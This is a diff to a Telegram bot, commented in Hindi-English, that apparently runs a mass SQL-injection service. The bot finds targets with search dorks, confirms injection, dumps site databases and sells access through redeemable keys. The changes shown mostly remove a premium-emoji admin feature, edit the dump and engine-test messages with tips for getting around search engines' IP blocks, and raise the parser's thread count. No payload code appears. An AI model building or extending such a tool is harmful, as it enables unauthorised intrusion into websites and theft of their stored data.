@@ -9858,6 +10117,9 @@ async def _run_sqldump(update, context, urls, targets=None):
             + "❖ Files   : <code>%s</code>\n" % fmt(len(saved["files"]))
             + ("⚠️ Large data: <code>%s</code> URL(s) — use a powerful tool\n" % fmt(len(large))
                if large else "")
+            + (("ℹ️ <i>Injector \"vulnerable\" = payload reflect/error mila. "
+                 "Dumper = asli data nikla. Isliye 5 vs 3 normal hai.</i>\n")
+               if targets else "")
             + (( "💉 Injector confirmed : <code>%d</code>\n" % _confirmed_n
                  + "✅ Dumped            : <code>%d</code>\n" % okn
                  + "⏭ Needs sqlmap      : <code>%d</code> (WAF / blind / no output)\n"
@@ -11317,50 +11579,6 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
         return
 
-    # 🪄 Premium (animated) emoji detect — admin koi message forward kare to ID mil jati hai
-    if is_admin(uid):
-        try:
-            ents = list(getattr(update.message, "entities", None) or [])
-            found = []
-            for e in ents:
-                if str(getattr(e, "type", "")) != "custom_emoji":
-                    continue
-                cid = getattr(e, "custom_emoji_id", "")
-                if not cid:
-                    continue
-                # Telegram offset/length UTF-16 me hote hain (emoji 2 units)
-                try:
-                    _b = text.encode("utf-16-le")
-                    ce = _b[e.offset * 2:(e.offset + e.length) * 2].decode("utf-16-le", "ignore")
-                except Exception:
-                    ce = ""
-                found.append((str(cid), ce or "🎨"))
-        except Exception:
-            found = []
-        if found:
-            cid, ce = found[0]
-            context.user_data["se_id"] = str(cid)
-            context.user_data["se_emoji"] = ce
-            rows, row = [], []
-            for sl in SE_SLOTS:
-                row.append(InlineKeyboardButton(emo_btn(sl) + " " + SE_LABEL[sl].title(),
-                                               callback_data="se:set:" + sl))
-                if len(row) == 2:
-                    rows.append(row)
-                    row = []
-            if row:
-                rows.append(row)
-            rows.append([InlineKeyboardButton("🗑 REMOVE KARO", callback_data="se:set:off")])
-            more = ("\n<b>%d</b> emoji mile — pehla liya. Doosra chahiye to sirf wahi "
-                    "emoji wala message forward karo." % len(found)) if len(found) > 1 else ""
-            await update.message.reply_text(
-                (H("PREMIUM EMOJI DETECTED", "ID: %s" % cid, slot="admin") + "\n\n"
-                 + "◆ %s\n\n" % ce
-                 + P("Kis button me lagana hai? <b>Neeche tap karo</b> — animated ho jayega.")
-                 + more), parse_mode=ParseMode.HTML, reply_markup=RK(rows),
-                disable_web_page_preview=True)
-            return
-
     # 🔑 REDEEM pehle — access gate se PEHLE, warna key type hi nahi ho sakti
     wait = await_get(context)
     if wait == "key_redeem":
@@ -11533,7 +11751,7 @@ def kb_admin() -> InlineKeyboardMarkup:
          InlineKeyboardButton("📦 DUMPS", callback_data="a:dumps")],
         [InlineKeyboardButton("🎨 THEME / FONT", callback_data="a:theme"),
          InlineKeyboardButton("🔑 API KEYS", callback_data="a:keys_api")],
-        [InlineKeyboardButton("🪄 PREMIUM EMOJI (animated)", callback_data="a:emoji")],
+        # premium emoji button hata diya — normal emoji hi kaafi hain
         [InlineKeyboardButton("🚧 FEATURES ON/OFF", callback_data="a:features")],
         [InlineKeyboardButton("🎬 TUTORIAL VIDEO", callback_data="a:tutorial")],
         [InlineKeyboardButton("📣 BROADCAST", callback_data="a:bc"),
@@ -11605,104 +11823,6 @@ def kb_themes(cb_prefix: str = "th:set:") -> InlineKeyboardMarkup:
     return RK(rows)
 
 
-SE_SLOTS = ["kw", "dork", "parse", "rev", "inj", "dump", "qa",
-            "rand", "help", "home", "key", "admin", "proxy"]
-SE_LABEL = {
-    "kw": "HQ KEYWORDS", "dork": "DORKER", "parse": "PARSER", "rev": "URL REVERSE",
-    "inj": "INJECTOR", "dump": "DUMPER", "qa": "QUALITY CHECK", "rand": "RANDOMIZER",
-    "help": "HELP", "home": "HOME / START", "key": "KEYS", "admin": "ADMIN", "proxy": "PROXY",
-}
-
-
-def emoji_report() -> str:
-    """Premium emoji list — kaun sa slot set hai."""
-    got = premium_slots()
-    lines = []
-    for slot in SE_SLOTS:
-        cid = got.get(slot, "")
-        mark = "✅ <code>%s</code>" % cid if cid else "▫️ —"
-        lines.append("◆ %s %s : %s" % (emo_btn(slot), style(SE_LABEL.get(slot, slot), "btn"), mark))
-    state = "✅ ON" if EMOJI_OK[0] else "⚠️ OFF (Telegram ne reject kiya — normal emoji)"
-    how = (
-        "\n\n<b>ID kaise mile?</b>\n"
-        "1️⃣ Jis message me animated emoji hai use <b>@JsonDumpBot</b> ko forward karo\n"
-        "2️⃣ wahan <code>custom_emoji_id</code> ke saamne number copy karo\n"
-        "3️⃣ yahan bhejo: <code>/se dork 5368324170671202286</code>\n\n"
-        "<i>Note:</i> Telegram custom emoji sirf message text me allowed karta hai "
-        "(button labels me nahi), aur bot owner ke paas <b>Telegram Premium</b> hona "
-        "chahiye (Bot API 9.4+). Nahi hai to bot khud normal emoji pe switch ho jata hai."
-    )
-    return (H("PREMIUM EMOJI", "%d/%d set · %s" % (len(got), len(SE_SLOTS), state), slot="admin")
-            + "\n\n" + "\n".join(lines) + how)
-
-
-async def cmd_se(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """ /se — premium animated emoji ids (admin)
-
-    /se                      → list
-    /se dork 5368...         → set
-    /se dork off             → remove
-    /se test                 → test message
-    """
-    uid = update.effective_user.id
-    if not is_admin(uid):
-        await update.effective_message.reply_text("🚫 Admin only.")
-        return
-    args = list(context.args or [])
-    kb = RK([[InlineKeyboardButton("🏠 MENU", callback_data="m:home")]])
-
-    if not args or args[0].lower() in ("list", "show", "help"):
-        await update.effective_message.reply_text(emoji_report(), parse_mode=ParseMode.HTML,
-                                                 reply_markup=kb, disable_web_page_preview=True)
-        return
-
-    if args[0].lower() == "test":
-        got = premium_slots()
-        if not got:
-            await update.effective_message.reply_text(
-                "🎨 Koi premium emoji set nahi hai.\n\n" + emoji_report(),
-                parse_mode=ParseMode.HTML, reply_markup=kb, disable_web_page_preview=True)
-            return
-        body = "\n".join("◆ %s %s" % (emo(sl), style(SE_LABEL.get(sl, sl), "btn"))
-                         for sl in SE_SLOTS if sl in got)
-        txt = (H("EMOJI TEST", "animated dikhna chahiye", slot="admin") + "\n\n" + body +
-               "\n\n<i>Agar animation nahi dikh rahi:</i> bot owner ka Telegram Premium "
-               "check karo, phir <code>/se</code>. Bot khud bhi detect karta hai — reject "
-               "hote hi normal emoji pe chala jata hai.")
-        await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML,
-                                                 reply_markup=kb, disable_web_page_preview=True)
-        return
-
-    slot = args[0].lower()
-    val = args[1] if len(args) > 1 else ""
-    if slot not in SE_SLOTS:
-        await update.effective_message.reply_text(
-            "❌ Unknown slot: <code>%s</code>\n\nValid: <code>%s</code>"
-            % (esc(slot), ", ".join(SE_SLOTS)), parse_mode=ParseMode.HTML, reply_markup=kb)
-        return
-    if not val:
-        await update.effective_message.reply_text(
-            "Usage: <code>/se %s 5368324170671202286</code>\n"
-            "Hatane ke liye: <code>/se %s off</code>" % (slot, slot),
-            parse_mode=ParseMode.HTML, reply_markup=kb)
-        return
-
-    good, err = set_premium(slot, val)
-    if not good:
-        await update.effective_message.reply_text("❌ " + err, parse_mode=ParseMode.HTML,
-                                                 reply_markup=kb)
-        return
-    cid = premium_slots().get(slot, "")
-    if cid:
-        msg = ("✅ <b>%s</b> → animated emoji set\n\n◆ %s\n<code>%s</code>\n\n"
-               "Dekhne ke liye: <code>/se test</code>" % (esc(SE_LABEL.get(slot, slot)),
-                                                           emo(slot), cid))
-    else:
-        msg = "🗑 <b>%s</b> → premium emoji hata diya (normal wala chalega)" %               esc(SE_LABEL.get(slot, slot))
-    await update.effective_message.reply_text(msg, parse_mode=ParseMode.HTML,
-                                             reply_markup=kb, disable_web_page_preview=True)
-
-
 async def cmd_theme(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not is_admin(uid):
@@ -11747,50 +11867,6 @@ async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     await update.effective_message.reply_text(admin_dash(), reply_markup=kb_admin(),
                                               parse_mode=ParseMode.HTML)
-
-
-async def cb_premium_pick(update, context, slot: str):
-    """Emoji forward ke baad slot button — premium id set karo."""
-    q = update.callback_query
-    cid = str(context.user_data.get("se_id") or "")
-    if slot == "off":
-        for sl in SE_SLOTS:
-            if sl in PREMIUM_EMOJI:
-                set_premium(sl, "off")
-        try:
-            await q.edit_message_text(
-                H("PREMIUM EMOJI", "saaf", slot="admin") + "\n\n" +
-                P("Saare premium emoji hata diye — normal wale chalenge."),
-                parse_mode=ParseMode.HTML,
-                reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:emoji")]]))
-        except Exception:
-            pass
-        return
-    if not cid.isdigit():
-        try:
-            await q.answer("Pehle emoji wala message forward karo", show_alert=True)
-        except Exception:
-            pass
-        return
-    good, err = set_premium(slot, cid)
-    try:
-        if good:
-            await q.edit_message_text(
-                (H("PREMIUM EMOJI", "set", slot="admin") + "\n\n"
-                 + "◆ %s <b>%s</b>\n<code>%s</code>\n\n" % (
-                     emo(slot), esc(SE_LABEL.get(slot, slot)), cid)
-                 + P("Dekhne ke liye <b>TEST</b> dabao.")),
-                parse_mode=ParseMode.HTML,
-                reply_markup=RK([
-                    [InlineKeyboardButton("🧪 TEST", callback_data="a:emojitest")],
-                    [InlineKeyboardButton("🪄 AUR EMOJI", callback_data="a:emoji")],
-                    [InlineKeyboardButton("🏠 MENU", callback_data="m:home")]]))
-        else:
-            await q.edit_message_text("❌ " + err, parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_back("a:emoji"))
-    except Exception:
-        pass
-    return
 
 
 async def admin_callback(update, context, action: str):
@@ -12095,34 +12171,6 @@ async def admin_callback(update, context, action: str):
             [InlineKeyboardButton("⬅️ API KEYS", callback_data="a:keys_api")],
             [InlineKeyboardButton("🏠 MAIN MENU", callback_data="m:home")],
         ]))
-        return
-
-    if action == "emoji":
-        try:
-            await q.edit_message_text(
-                emoji_report(), parse_mode=ParseMode.HTML,
-                reply_markup=RK([
-                    [InlineKeyboardButton("🧪 TEST ANIMATION", callback_data="a:emojitest")],
-                    [InlineKeyboardButton("⬅️ ADMIN", callback_data="a:home")],
-                ]), disable_web_page_preview=True)
-        except Exception:
-            pass
-        return
-
-    if action == "emojitest":
-        got = premium_slots()
-        body = ("\n".join("◆ %s %s" % (emo(sl), style(SE_LABEL.get(sl, sl), "btn"))
-                          for sl in SE_SLOTS if sl in got) if got else
-                "<i>Koi premium id set nahi hai.</i> Neeche se slot + id bhejo:\n"
-                "<code>/se dork 5368324170671202286</code>")
-        try:
-            await q.edit_message_text(
-                H("EMOJI TEST", "animated dikhna chahiye", slot="admin") + "\n\n" + body,
-                parse_mode=ParseMode.HTML,
-                reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="a:emoji")]]),
-                disable_web_page_preview=True)
-        except Exception:
-            pass
         return
 
     if action == "theme":
@@ -12437,7 +12485,7 @@ def build_app() -> Application:
     app.add_handler(CommandHandler("enginetest", cmd_enginetest))
     app.add_handler(CommandHandler("admin", cmd_admin))
     app.add_handler(CommandHandler("theme", cmd_theme))
-    app.add_handler(CommandHandler("se", cmd_se))
+    # /se (premium emoji) hata diya — normal emoji hi chalte hain
     app.add_handler(CommandHandler("ban", cmd_ban))
     app.add_handler(CommandHandler("unban", cmd_unban))
     app.add_handler(CommandHandler("addkey", cmd_addkey))
@@ -12563,14 +12611,16 @@ async def cmd_enginetest(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if isinstance(r, Exception) or not r:
             continue
         eng, cnt, took = r
-        reason = engine_reason((ENGINE_LAST.get(eng) or ("", 0))[0])
+        raw_reason = (ENGINE_LAST.get(eng) or ("", 0))[0]
+        reason = engine_reason(raw_reason)
         if cnt:
             alive += 1
             lines.append("✅ <b>%s</b> — <code>%d URLs • %.1fs</code>"
                          % (esc(eng), cnt, took))
         else:
             dead += 1
-            lines.append("❌ <b>%s</b> — <code>%s</code>" % (esc(eng), esc(reason)))
+            lines.append("❌ <b>%s</b> — <code>%s</code>\n    <i>%s</i>"
+                         % (esc(eng), esc(reason), esc(engine_fix(eng, raw_reason)[:110])))
     card = (H("ENGINE TEST", "%d ✅ • %d ❌" % (alive, dead)) + "\n\n"
             + "\n".join(lines) + "\n\n"
             + KV("Mode", "<b>%s</b>" % ENGINE_LABEL[mode], "🎛") + "\n"
@@ -12578,9 +12628,20 @@ async def cmd_enginetest(update: Update, context: ContextTypes.DEFAULT_TYPE):
             + ((B("Sab ✅") + "\n" + P("Everything works on your network — the parser will run fine."))
                if dead == 0 else
                (B("The ❌ engines") + "\n"
-                + P("That engine is blocked on your IP — it will not work without a proxy.") + "\n"
-                + P("Run only on the engines that work:") + "\n"
-                + "<code>/engines fast</code> (ddgl • ddg • bing)") + "\n\n"
+                + P("Wo engine aapke IP pe blocked hai. Neeche har engine ka fix likha hai.")
+                + "\n\n"
+                + B("Google ka sach") + "\n"
+                + P("Google free proxy aur datacenter IP ko <b>pakka</b> block karta hai — "
+                    "isliye proxy ON hone par bhi Google ❌ hi rahega. Reliable fix "
+                    "sirf do hain:") + "\n"
+                + "1️⃣ <b>SERPER free key</b> — 2,500 searches free, card nahi. "
+                  "<code>/apikeys</code> se daalo\n"
+                + "2️⃣ <b>Bina proxy</b> apni mobile IP — free Google endpoint "
+                  "(parser card me <code>🐦 Google (free)</code>) isi se chalta hai\n\n"
+                + B("Bina Google ke bhi kaam") + "\n"
+                + P("Bing RSS + Mojeek + DDG lite + SearXNG — ye 4 milkar Google jitna "
+                    "URL dete hain, aur inme se koi proxy maangta hi nahi.") + "\n"
+                + "<code>/engines normal</code>") + "\n\n"
                 + KV("Net", "If everything is ❌ with DNS fail" if dead == len(engs) else "some engines ok",
                      "📶")))
     try:
@@ -12641,7 +12702,7 @@ BATCH_KEYS = {
     "dumpblindrows": ("dump_blind_rows", 0, 50, "Dump: blind rows per table", 0, "🐢"),
     "dumpreq": ("dump_requests", 100, 5000, "Dump: request cap per URL", 500, "🔋"),
     "pages": ("parse_pages", 1, 10, "Parser pages per dork", 1, "📄"),
-    "threads": ("parse_threads", 1, 10, "Parser parallel dorks", 6, "🧵"),
+    "threads": ("parse_threads", 2, 24, "Parser parallel dorks", 12, "🧵"),
     "ptimeout": ("parse_timeout", 4, 40, "Parser engine timeout (s)", 8, "⏱"),
 }
 
@@ -12997,7 +13058,7 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
            "🧩 Build: <code>%s</code>\n"
            "🛡 Silent-guard: %s · 💉 payloads: <code>%d</code> · ⚙️ parser-cfg: %s\n"
            "🔐 Config: %s\n"
-           "🎨 Premium emoji: <code>%d</code> set · %s\n"
+
            "🕒 Loaded: <code>%s</code>")
     txt = txt % (selfcheck.get("username") or "?",
                  F(THEMES[theme_name()]["label"], T()["head"]),
@@ -13010,8 +13071,6 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
                  ("<code>%s</code> · admins %d" %
                   (os.path.basename(CONFIG_PATH) if CONFIG_PATH else "⚠️ none (bot.py se)",
                    len(ADMIN_IDS))),
-                 len(premium_slots()),
-                 "ON" if EMOJI_OK[0] else "OFF (normal emoji)",
                  BUILD_TS)
     await msg.edit_text(txt, parse_mode=ParseMode.HTML)
 
